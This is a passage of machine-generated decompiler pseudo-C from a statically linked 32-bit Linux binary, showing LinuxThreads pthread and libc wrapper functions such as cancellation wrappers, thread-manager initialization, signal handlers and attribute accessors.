  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_write(fd, addr, len);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804CE16) --------------------------------------------------------
unsigned int __usercall waitpid@<eax>(off_t a1@<ebp>, pid_t pid, int *status, int options)
{
  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_waitpid(pid, status, options);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804CE50) --------------------------------------------------------
unsigned int __usercall wait@<eax>(off_t a1@<ebp>, int *status)
{
  unsigned int v2; // ebx@1
  unsigned int v4; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v4);
  v2 = _libc_wait(status);
  pthread_setcanceltype(a1, v4, 0);
  return v2;
}

//----- (0804CE80) --------------------------------------------------------
unsigned int __usercall tcdrain@<eax>(off_t a1@<ebp>, int d)
{
  unsigned int v2; // ebx@1
  unsigned int v4; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v4);
  v2 = _libc_tcdrain(d);
  pthread_setcanceltype(a1, v4, 0);
  return v2;
}

//----- (0804CEB0) --------------------------------------------------------
int __usercall system@<eax>(off_t a1@<ebp>, int a2)
{
  int v2; // ebx@1
  unsigned int v4; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v4);
  v2 = _libc_system(a2);
  pthread_setcanceltype(a1, v4, 0);
  return v2;
}

//----- (0804CEE0) --------------------------------------------------------
unsigned int __usercall read@<eax>(off_t a1@<ebp>, int fd, void *addr, size_t len)
{
  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_read(fd, addr, len);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804CF1A) --------------------------------------------------------
unsigned int __usercall pwrite@<eax>(off_t a1@<ebp>, off_t offset, void *addr, size_t len, off_t a5)
{
  unsigned int v5; // ebx@1
  unsigned int v7; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v7);
  v5 = _libc_pwrite(offset, addr, len, a5);
  pthread_setcanceltype(a1, v7, 0);
  return v5;
}

//----- (0804CF56) --------------------------------------------------------
unsigned int __usercall pread64@<eax>(off_t a1@<ebp>, int a2, void *addr, size_t len, int a5, int a6)
{
  unsigned int v6; // ebx@1
  unsigned int v8; // [esp+20h] [ebp-Ch]@1

  pthread_setcanceltype(a1, 1u, &v8);
  v6 = _libc_pread64(a2, addr, len, a5, a6);
  pthread_setcanceltype(a1, v8, 0);
  return v6;
}

//----- (0804CF9C) --------------------------------------------------------
unsigned int __usercall pread@<eax>(off_t a1@<ebp>, off_t offset, void *addr, size_t len, off_t a5)
{
  unsigned int v5; // ebx@1
  unsigned int v7; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v7);
  v5 = _libc_pread(offset, addr, len, a5);
  pthread_setcanceltype(a1, v7, 0);
  return v5;
}

//----- (0804CFD8) --------------------------------------------------------
signed int __usercall pause@<eax>(off_t a1@<ebp>)
{
  signed int v1; // ebx@1
  unsigned int v3; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v3);
  v1 = _libc_pause();
  pthread_setcanceltype(a1, v3, 0);
  return v1;
}

//----- (0804D003) --------------------------------------------------------
unsigned int __usercall open64@<eax>(off_t a1@<ebp>, char *filename, int a3, int a4)
{
  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_open64(filename, a3, a4);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804D045) --------------------------------------------------------
unsigned int __usercall open@<eax>(off_t a1@<ebp>, char *filename, int flags, int a4)
{
  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_open(filename, flags, a4);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804D087) --------------------------------------------------------
unsigned int __usercall nanosleep@<eax>(off_t ebp0@<ebp>, int a1, struct timespec *rem)
{
  unsigned int v3; // ebx@1
  unsigned int v5; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(ebp0, 1u, &v5);
  v3 = _libc_nanosleep(a1, rem);
  pthread_setcanceltype(ebp0, v5, 0);
  return v3;
}

//----- (0804D0BC) --------------------------------------------------------
unsigned int __usercall msync@<eax>(off_t a1@<ebp>, void *addr, size_t length, int flags)
{
  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_msync(addr, length, flags);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804D0F6) --------------------------------------------------------
int __usercall lseek64@<eax>(off_t a1@<ebp>, int fd, unsigned __int32 offset_low, unsigned __int32 offset_high, unsigned int whence)
{
  int v5; // ebx@1
  unsigned int v7; // [esp+18h] [ebp-Ch]@1

  pthread_setcanceltype(a1, 1u, &v7);
  v5 = _libc_lseek64(fd, offset_low, offset_high, whence);
  pthread_setcanceltype(a1, v7, 0);
  return v5;
}

//----- (0804D13A) --------------------------------------------------------
unsigned int __usercall lseek@<eax>(off_t a1@<ebp>, int fd, off_t offset, int whence)
{
  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_lseek(fd, offset, whence);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804D174) --------------------------------------------------------
unsigned int __usercall fsync@<eax>(off_t a1@<ebp>, int fd)
{
  unsigned int v2; // ebx@1
  unsigned int v4; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v4);
  v2 = _libc_fsync(fd);
  pthread_setcanceltype(a1, v4, 0);
  return v2;
}

//----- (0804D1A4) --------------------------------------------------------
unsigned int __usercall fcntl@<eax>(off_t a1@<ebp>, int fd, int cmd, struct flock *lock)
{
  unsigned int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_fcntl(fd, cmd, lock);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804D1E6) --------------------------------------------------------
unsigned int __usercall close@<eax>(off_t a1@<ebp>, int fd)
{
  unsigned int v2; // ebx@1
  unsigned int v4; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v4);
  v2 = _libc_close(fd);
  pthread_setcanceltype(a1, v4, 0);
  return v2;
}

//----- (0804D218) --------------------------------------------------------
int _libc_current_sigrtmin()
{
  return current_rtmin;
}
// 8061978: using guessed type int current_rtmin;

//----- (0804D21E) --------------------------------------------------------
int _libc_current_sigrtmax()
{
  return current_rtmax;
}
// 806197C: using guessed type int current_rtmax;

//----- (0804D224) --------------------------------------------------------
int __cdecl _libc_allocate_rtsig(int a1)
{
  int v1; // ecx@1

  v1 = current_rtmin;
  if ( current_rtmin == -1 || current_rtmin > current_rtmax )
    return -1;
  if ( !a1 )
    return current_rtmax--;
  ++current_rtmin;
  return v1;
}
// 8061978: using guessed type int current_rtmin;
// 806197C: using guessed type int current_rtmax;

//----- (0804D25C) --------------------------------------------------------
_BOOL4 __cdecl pthread_equal(int a1, int a2)
{
  return a1 == a2;
}

//----- (0804D26C) --------------------------------------------------------
int __cdecl pthread_setconcurrency(int a1)
{
  current_level = a1;
  return 0;
}
// 80661E4: using guessed type int current_level;

//----- (0804D278) --------------------------------------------------------
int pthread_getconcurrency()
{
  return current_level;
}
// 80661E4: using guessed type int current_level;

//----- (0804D27E) --------------------------------------------------------
signed int __usercall _pthread_timedsuspend_new@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>, int a5, _DWORD *a6)
{
  int v6; // eax@1
  signed int v7; // edx@1
  int v8; // ecx@3
  int v9; // edx@3
  char v11; // [esp+14h] [ebp-1B0h]@1
  char v12; // [esp+B0h] [ebp-114h]@7
  char v13; // [esp+130h] [ebp-94h]@2
  int v14; // [esp+1B0h] [ebp-14h]@3
  int v15; // [esp+1B4h] [ebp-10h]@3
  int v16; // [esp+1B8h] [ebp-Ch]@3
  int v17; // [esp+1BCh] [ebp-8h]@3

  v6 = _sigsetjmp(a1, a2, a3, a4, (int)&v11, 1);
  v7 = 1;
  if ( !v6 )
  {
    *(_DWORD *)(a5 + 36) = &v11;
    *(_DWORD *)(a5 + 32) = 0;
    sigemptyset(&v13);
    sigaddset((int)&v13, _pthread_sig_restart);
    sigprocmask(1u, (int)&v13);
    do
    {
      gettimeofday((int)&v16, 0);
      v8 = *a6 - v16;
      v9 = a6[1] - 1000 * v17;
      v15 = v9;
      v14 = v8;
      if ( v9 < 0 )
      {
        v15 = v9 + 1000000000;
        v14 = v8 - 1;
      }
    }
    while ( v14 >= 0 && _libc_nanosleep((int)&v14, 0) );
    sigprocmask(2u, (int)&v12);
    v7 = 0;
  }
  *(_DWORD *)(a5 + 36) = 0;
  return v7;
}

//----- (0804D398) --------------------------------------------------------
unsigned int __cdecl _pthread_restart_new(int a1)
{
  return kill(*(_DWORD *)(a1 + 20), _pthread_sig_restart);
}

//----- (0804D3B1) --------------------------------------------------------
int __cdecl _pthread_wait_for_restart_signal(int a1)
{
  int result; // eax@2
  char v2; // [esp+8h] [ebp-88h]@1

  sigprocmask(2u, 0);
  sigdelset((int)&v2, _pthread_sig_restart);
  *(_DWORD *)(a1 + 32) = 0;
  do
  {
    sigsuspend();
    result = *(_DWORD *)(a1 + 32);
  }
  while ( result != _pthread_sig_restart );
  return result;
}

//----- (0804D40A) --------------------------------------------------------
int __usercall suspend_1@<eax>(int a1@<eax>)
{
  return _pthread_wait_for_restart_signal(a1);
}

//----- (0804D417) --------------------------------------------------------
unsigned int _pthread_find_self()
{
  _DWORD *i; // edx@1
  unsigned int result; // eax@3
  void *retaddr; // [esp+0h] [ebp+0h]@3

  for ( i = &unk_805D4E0; ; i += 4 )
  {
    result = i[2];
    if ( (unsigned int)&retaddr <= result && (unsigned int)&retaddr >= i[3] )
      break;
  }
  return result;
}

//----- (0804D430) --------------------------------------------------------
void **thread_self_3()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804D46F) --------------------------------------------------------
void __usercall pthread_onexit_process(off_t a1@<ebp>, int a2)
{
  void **v2; // ebx@2
  void **addr; // [esp+14h] [ebp-98h]@2
  int v4; // [esp+18h] [ebp-94h]@2
  int v5; // [esp+1Ch] [ebp-90h]@2

  if ( _pthread_manager_request >= 0 )
  {
    v4 = 2;
    v2 = thread_self_3();
    addr = v2;
    v5 = a2;
    while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
      ;
    suspend_1((int)v2);
    if ( v2 == _pthread_main_thread )
    {
      waitpid(a1, pid, 0, 2147483648);
      _pthread_manager_thread_tos = 0;
      _pthread_manager_thread_bos = 0;
    }
  }
}
// 80618A0: using guessed type void **_pthread_main_thread;
// 80661D0: using guessed type int _pthread_manager_thread_bos;

//----- (0804D504) --------------------------------------------------------
void *pthread_self()
{
  return thread_self_3()[4];
}

//----- (0804D50D) --------------------------------------------------------
signed int __usercall _pthread_reset_main_thread@<eax>(unsigned int a1@<ebp>)
{
  void **v1; // ebx@1
  signed int result; // eax@3

  v1 = thread_self_3();
  if ( _pthread_manager_request != -1 )
  {
    free(a1, (_DWORD *)_pthread_manager_thread_bos);
    _pthread_manager_thread_tos = 0;
    _pthread_manager_thread_bos = 0;
    _libc_close(_pthread_manager_request);
    _libc_close(_pthread_manager_reader);
    _pthread_manager_reader = -1;
    _pthread_manager_request = -1;
  }
  result = getpid();
  v1[5] = (void *)result;
  _pthread_main_thread = v1;
  *v1 = v1;
  v1[1] = v1;
  v1[17] = &errno;
  v1[19] = &h_errno;
  return result;
}
// 80618A0: using guessed type void **_pthread_main_thread;
// 80661D0: using guessed type int _pthread_manager_thread_bos;

//----- (0804D597) --------------------------------------------------------
signed int __usercall pthread_kill_other_threads_np@<eax>(unsigned __int32 a1@<ebp>)
{
  signed int result; // eax@1
  int v2; // [esp+14h] [ebp-90h]@1
  char v3; // [esp+18h] [ebp-8Ch]@1
  int v4; // [esp+98h] [ebp-Ch]@1

  pthread_onexit_process(a1, 0);
  _pthread_reset_main_thread(a1);
  sigemptyset(&v3);
  v4 = 0;
  v2 = 0;
  _libc_sigaction(_pthread_sig_restart, (int)&v2, 0);
  _libc_sigaction(_pthread_sig_cancel, (int)&v2, 0);
  result = _pthread_sig_debug;
  if ( _pthread_sig_debug > 0 )
    result = _libc_sigaction(_pthread_sig_debug, (int)&v2, 0);
  return result;
}

//----- (0804D611) --------------------------------------------------------
#error "804D611: stack frame is too big (funcsize=0)"

//----- (0804D7B4) --------------------------------------------------------
signed int __usercall _pthread_initialize_manager@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>)
{
  int v2; // eax@3
  int v3; // edx@3
  signed int result; // eax@3
  int v5; // eax@10
  int v6; // ebx@10
  void **v7; // eax@19
  int *v8; // [esp+10h] [ebp-ACh]@0
  struct user_desc *v9; // [esp+14h] [ebp-A8h]@0
  int *v10; // [esp+18h] [ebp-A4h]@0
  char addr; // [esp+1Ch] [ebp-A0h]@21
  int v12; // [esp+20h] [ebp-9Ch]@20
  int fd; // [esp+B0h] [ebp-Ch]@4
  int v14; // [esp+B4h] [ebp-8h]@15

  *(_DWORD *)_libc_multiple_threads_ptr = 1;
  if ( !_pthread_initial_thread_bos )
    pthread_initialize();
  v2 = malloc(a1, a2, 2 * _pagesize - 32);
  v3 = v2;
  _pthread_manager_thread_bos = v2;
  result = -1;
  if ( v3 )
  {
    _pthread_manager_thread_tos = v3 + 2 * _pagesize - 32;
    if ( pipe(&fd) == -1 )
    {
      free(a1, (_DWORD *)_pthread_manager_thread_bos);
      return -1;
    }
    if ( _linuxthreads_initial_report_events )
      dword_806167C = _linuxthreads_initial_report_events;
    if ( !dword_806167C || (char)(_pthread_threads_events | byte_8061680) >= 0 )
      goto LABEL_26;
    _pthread_lock((volatile signed __int32 *)off_80616DC, 0);
    v5 = clone((int)_pthread_manager_event, _pthread_manager_thread_tos, 3840, fd, v8, v9, v10);
    v6 = v5;
    if ( v5 != -1 )
    {
      dword_806186C = (int)&_pthread_manager_thread;
      dword_8061868 = 8;
      _pthread_last_event = (int)&_pthread_manager_thread;
      dword_80616D0 = 2049;
      pid = v5;
      _linuxthreads_create_event();
    }
    _pthread_unlock((volatile signed __int32 *)off_80616DC);
    if ( !v6 )
LABEL_26:
      v6 = clone((int)_pthread_manager, _pthread_manager_thread_tos, 3840, fd, v8, v9, v10);
    if ( v6 == -1 )
    {
      free(a1, (_DWORD *)_pthread_manager_thread_bos);
      _libc_close(fd);
      _libc_close(v14);
      return -1;
    }
    dword_80616D0 = 2049;
    _pthread_manager_request = v14;
    _pthread_manager_reader = fd;
    pid = v6;
    if ( _pthread_threads_debug && _pthread_sig_debug > 0 )
    {
      raise(_pthread_sig_debug);
      v7 = thread_self_3();
      _pthread_wait_for_restart_signal((int)v7);
    }
    v12 = 5;
    while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
      ;
    result = 0;
  }
  return result;
}
// 804D611: using guessed type int pthread_initialize(void);
// 804E63C: using guessed type int _linuxthreads_create_event(void);
// 806167C: using guessed type int dword_806167C;
// 8061680: using guessed type char byte_8061680;
// 80616D0: using guessed type int dword_80616D0;
// 80616DC: using guessed type void *off_80616DC;
// 8061868: using guessed type int dword_8061868;
// 806186C: using guessed type int dword_806186C;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 80661E0: using guessed type int _libc_multiple_threads_ptr;
// 806A474: using guessed type int _pagesize;
// 806A600: using guessed type int _pthread_nonstandard_stacks;
// 806A604: using guessed type int _pthread_threads_events;
// 806A60C: using guessed type int _pthread_last_event;
// 806A610: using guessed type int _pthread_threads_debug;
// 806A614: using guessed type int _linuxthreads_initial_report_events;

//----- (0804D9B9) --------------------------------------------------------
signed int __usercall pthread_create@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, _DWORD *a3, int a4, int a5, int a6)
{
  signed int v6; // eax@2
  signed int v7; // edx@2
  int v8; // ebx@3
  void **addr; // [esp+14h] [ebp-98h]@3
  int v11; // [esp+18h] [ebp-94h]@3
  int v12; // [esp+1Ch] [ebp-90h]@3
  int v13; // [esp+20h] [ebp-8Ch]@3
  int v14; // [esp+24h] [ebp-88h]@3

  if ( _pthread_manager_request >= 0 || (v6 = _pthread_initialize_manager(a1, a2), v7 = 11, v6 >= 0) )
  {
    v11 = 0;
    addr = thread_self_3();
    v8 = (int)addr;
    v12 = a4;
    v13 = a5;
    v14 = a6;
    sigprocmask(2u, 0);
    while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
      ;
    suspend_1(v8);
    if ( !*(_DWORD *)(v8 + 52) )
      *a3 = *(_DWORD *)(v8 + 48);
    v7 = *(_DWORD *)(v8 + 52);
  }
  return v7;
}

//----- (0804DA72) --------------------------------------------------------
_DWORD *__usercall pthread_handle_sigcancel@<eax>(off_t a1@<ebp>)
{
  void **v1; // eax@1
  struct __jmp_buf_tag *v3; // edx@11
  int v4; // [esp+4h] [ebp-8h]@0
  char v5; // [esp+8h] [ebp-4h]@10

  v1 = thread_self_3();
  if ( v1 == (void **)&_pthread_manager_thread )
    return _pthread_manager_sighandler();
  if ( _pthread_exit_requested )
  {
    if ( v1 == _pthread_main_thread )
      waitpid(a1, pid, 0, 2147483648);
    exit(_pthread_exit_code);
  }
  if ( *((_BYTE *)v1 + 66) && !*((_BYTE *)v1 + 64) )
  {
    if ( *((_BYTE *)v1 + 65) == 1 )
      _pthread_do_exit(a1, (void *)0xFFFFFFFF, (unsigned int)&v5);
    v3 = (struct __jmp_buf_tag *)v1[10];
    if ( v3 )
    {
      v1[10] = 0;
      siglongjmp(v3, 1);
    }
  }
  return (_DWORD *)v4;
}
// 80618A0: using guessed type void **_pthread_main_thread;
// 80661D8: using guessed type int _pthread_exit_requested;

//----- (0804DB03) --------------------------------------------------------
struct __jmp_buf_tag *__cdecl pthread_handle_sigrestart(void *a1)
{
  void **v1; // eax@1
  struct __jmp_buf_tag *result; // eax@1

  v1 = thread_self_3();
  v1[8] = a1;
  result = (struct __jmp_buf_tag *)v1[9];
  if ( result )
    siglongjmp(result, 1);
  return result;
}

//----- (0804DB27) --------------------------------------------------------
void *_pthread_initialize_minimal()
{
  void *result; // eax@1

  result = _libc_pthread_init();
  _libc_multiple_threads_ptr = (int)result;
  return result;
}
// 80661E0: using guessed type int _libc_multiple_threads_ptr;

//----- (0804DB3A) --------------------------------------------------------
int __cdecl pthread_setschedparam(int a1, int policy, struct sched_param *p)
{
  int *v3; // esi@1
  _DWORD *v4; // ebx@1
  int result; // eax@3
  int v6; // eax@6

  v3 = &_pthread_handles[4 * (a1 & 0x3FF)];
  _pthread_lock((volatile signed __int32 *)v3, 0);
  v4 = (_DWORD *)v3[2];
  if ( v4 && v4[4] == a1 )
  {
    if ( sched_setscheduler(v4[5], policy, p) == -1 )
    {
      _pthread_unlock((volatile signed __int32 *)v3);
      result = *(_DWORD *)_errno_location();
    }
    else
    {
      v6 = 0;
      if ( policy )
        v6 = p->__sched_priority;
      v4[6] = v6;
      _pthread_unlock((volatile signed __int32 *)v3);
      result = 0;
      if ( _pthread_manager_request >= 0 )
      {
        _pthread_manager_adjust_prio(v4[6]);
        result = 0;
      }
    }
  }
  else
  {
    _pthread_unlock((volatile signed __int32 *)v3);
    result = 3;
  }
  return result;
}
// 805D4C0: using guessed type int _pthread_handles[];

//----- (0804DBE2) --------------------------------------------------------
int __cdecl pthread_getschedparam(int a1, int a2, struct sched_param *p)
{
  int *v3; // ebx@1
  int v4; // eax@1
  int result; // eax@3
  pid_t pid; // esi@4
  unsigned int v7; // ebx@4

  v3 = &_pthread_handles[4 * (a1 & 0x3FF)];
  _pthread_lock((volatile signed __int32 *)v3, 0);
  v4 = v3[2];
  if ( v4 && *(_DWORD *)(v4 + 16) == a1 )
  {
    pid = *(_DWORD *)(v4 + 20);
    _pthread_unlock((volatile signed __int32 *)v3);
    v7 = sched_getscheduler(pid);
    if ( v7 != -1 && sched_getparam(pid, p) != -1 )
    {
      *(_DWORD *)a2 = v7;
      result = 0;
    }
    else
    {
      result = *(_DWORD *)_errno_location();
    }
  }
  else
  {
    _pthread_unlock((volatile signed __int32 *)v3);
    result = 3;
  }
  return result;
}
// 805D4C0: using guessed type int _pthread_handles[];

//----- (0804DC68) --------------------------------------------------------
int pthread_attr_destroy()
{
  return 0;
}

//----- (0804DC6B) --------------------------------------------------------
signed int __cdecl pthread_attr_setdetachstate(unsigned int *a1, unsigned int a2)
{
  signed int result; // eax@1

  result = 22;
  if ( a2 <= 1 )
  {
    *a1 = a2;
    result = 0;
  }
  return result;
}

//----- (0804DC82) --------------------------------------------------------
int __cdecl pthread_attr_getdetachstate(_DWORD *a1, _DWORD *a2)
{
  *a2 = *a1;
  return 0;
}

//----- (0804DC91) --------------------------------------------------------
signed int __cdecl pthread_attr_setschedpolicy(int a1, unsigned int a2)
{
  signed int result; // eax@1

  result = 22;
  if ( a2 <= 2 )
  {
    *(_DWORD *)(a1 + 4) = a2;
    result = 0;
  }
  return result;
}

//----- (0804DCA9) --------------------------------------------------------
int __cdecl pthread_attr_getschedpolicy(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 4);
  return 0;
}

//----- (0804DCB9) --------------------------------------------------------
signed int __cdecl pthread_attr_setinheritsched(int a1, unsigned int a2)
{
  signed int result; // eax@1

  result = 22;
  if ( a2 <= 1 )
  {
    *(_DWORD *)(a1 + 12) = a2;
    result = 0;
  }
  return result;
}

//----- (0804DCD1) --------------------------------------------------------
int __cdecl pthread_attr_getinheritsched(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 12);
  return 0;
}

//----- (0804DCE1) --------------------------------------------------------
signed int __cdecl pthread_attr_setscope(int a1, int a2)
{
  if ( a2 )
    return a2 == 1 ? 95 : 22;
  *(_DWORD *)(a1 + 16) = 0;
  return 0;
}

//----- (0804DD06) --------------------------------------------------------
int __cdecl pthread_attr_getscope(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 16);
  return 0;
}

//----- (0804DD16) --------------------------------------------------------
int __cdecl pthread_attr_getguardsize(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 20);
  return 0;
}

//----- (0804DD26) --------------------------------------------------------
int __cdecl pthread_attr_setstackaddr(int a1, int a2)
{
  int result; // eax@1

  *(_DWORD *)(a1 + 28) = a2;
  result = 0;
  *(_DWORD *)(a1 + 24) = 1;
  return result;
}

//----- (0804DD3B) --------------------------------------------------------
int __cdecl pthread_attr_getstackaddr(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 28);
  return 0;
}

//----- (0804DD4B) --------------------------------------------------------
signed int __cdecl pthread_attr_setstacksize(int a1, unsigned int a2)
{
  signed int result; // eax@1

  result = 22;
  if ( a2 > 0x3FFF )
  {
    *(_DWORD *)(a1 + 32) = a2;
    result = 0;
  }
  return result;
}

//----- (0804DD66) --------------------------------------------------------
int __cdecl pthread_attr_getstacksize(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 32);
  return 0;
}

//----- (0804DD76) --------------------------------------------------------
int __cdecl pthread_attr_init(_DWORD *a1)
{
  signed int v1; // eax@1

  v1 = getpagesize();
  a1[5] = v1;
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 1;
  a1[4] = 0;
  a1[7] = 0;
  a1[6] = 0;
  a1[8] = 0x200000 - v1;
  return 0;
}

//----- (0804DDC6) --------------------------------------------------------
char __cdecl pthread_attr_setguardsize(int a1, int a2)
{
  unsigned int v2; // eax@1
  unsigned int v3; // esi@1
  unsigned int v4; // ecx@1
  char result; // al@1
  unsigned int v6; // ecx@1

  v2 = getpagesize();
  v3 = v2;
  v4 = (a2 + v2 - 1) / v2;
  result = 22;
  v6 = v3 * v4;
  if ( v6 < *(_DWORD *)(a1 + 32) )
  {
    *(_DWORD *)(a1 + 20) = v6;
    result = 0;
  }
  return result;
}

//----- (0804DDFC) --------------------------------------------------------
int __cdecl pthread_attr_getschedparam(int a1, char *a2)
{
  memcpy(a2, (char *)(a1 + 8), 4u);
  return 0;
}

//----- (0804DE18) --------------------------------------------------------
signed int __cdecl pthread_attr_setschedparam(int a1, char *a2)
{
  signed int v2; // ebx@1

  v2 = sched_get_priority_max(*(_DWORD *)(a1 + 4));
  if ( *(_DWORD *)a2 < (signed int)sched_get_priority_min(*(_DWORD *)(a1 + 4)) || *(_DWORD *)a2 > v2 )
    return 22;
  memcpy((char *)(a1 + 8), a2, 4u);
  return 0;
}

//----- (0804DE64) --------------------------------------------------------
void **thread_self_4()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804DEA3) --------------------------------------------------------
int __usercall _pthread_perform_cleanup@<eax>(off_t a1@<ebp>, unsigned int a2)
{
  int result; // eax@1
  int v3; // esi@1
  unsigned int i; // ebx@1

  result = (int)thread_self_4();
  v3 = result;
  for ( i = *(_DWORD *)(result + 60); i && i > a2; i = *(_DWORD *)(i + 12) )
    result = (*(int (__cdecl **)(_DWORD))i)(*(_DWORD *)(i + 4));
  if ( *(_DWORD *)(v3 + 372) )
    result = _rpc_thread_destroy(a1, a2);
  return result;
}

//----- (0804DEE1) --------------------------------------------------------
__int64 __cdecl pthread_cleanup_push_defer(_DWORD *a1, int a2, int a3)
{
  void **v3; // eax@1
  void **v4; // edx@1
  _DWORD *v5; // eax@1
  __int64 v7; // [esp+0h] [ebp-Ch]@0

  v3 = thread_self_4();
  v4 = v3;
  *a1 = a2;
  a1[1] = a3;
  a1[2] = *((char *)v3 + 65);
  v5 = v3[15];
  a1[3] = v5;
  if ( v5 && a1 >= v5 )
    a1[3] = 0;
  *((_BYTE *)v4 + 65) = 0;
  v4[15] = a1;
  return v7;
}

//----- (0804DF24) --------------------------------------------------------
void **__cdecl pthread_cleanup_pop(int a1, int a2)
{
  void **result; // eax@3

  if ( a2 )
    (*(void (__cdecl **)(_DWORD))a1)(*(_DWORD *)(a1 + 4));
  result = thread_self_4();
  result[15] = *(void **)(a1 + 12);
  return result;
}

//----- (0804DF4D) --------------------------------------------------------
__int64 __cdecl pthread_cleanup_push(_DWORD *a1, int a2, int a3)
{
  void **v3; // eax@1
  void **v4; // edx@1
  _DWORD *v5; // eax@1
  __int64 v7; // [esp+0h] [ebp-Ch]@0

  v3 = thread_self_4();
  v4 = v3;
  *a1 = a2;
  a1[1] = a3;
  v5 = v3[15];
  a1[3] = v5;
  if ( v5 && a1 >= v5 )
    a1[3] = 0;
  v4[15] = a1;
  return v7;
}

//----- (0804DF85) --------------------------------------------------------
int __usercall pthread_cleanup_pop_restore@<eax>(off_t ebp0@<ebp>, int a1, int a2)
{
  void **v3; // ebx@1
  int result; // eax@3
  char v5; // [esp+4h] [ebp-8h]@5

  v3 = thread_self_4();
  if ( a2 )
    (*(void (__cdecl **)(_DWORD))a1)(*(_DWORD *)(a1 + 4));
  v3[15] = *(void **)(a1 + 12);
  result = *(_DWORD *)(a1 + 8);
  *((_BYTE *)v3 + 65) = result;
  if ( *((_BYTE *)v3 + 66) )
  {
    if ( *((_WORD *)v3 + 32) == 256 )
      _pthread_do_exit(ebp0, (void *)0xFFFFFFFF, (unsigned int)&v5);
  }
  return result;
}

//----- (0804DFD3) --------------------------------------------------------
void **__usercall pthread_testcancel@<eax>(off_t a1@<ebp>)
{
  void **result; // eax@1
  void *retaddr; // [esp+Ch] [ebp+0h]@3

  result = thread_self_4();
  if ( *((_BYTE *)result + 66) )
  {
    if ( !*((_BYTE *)result + 64) )
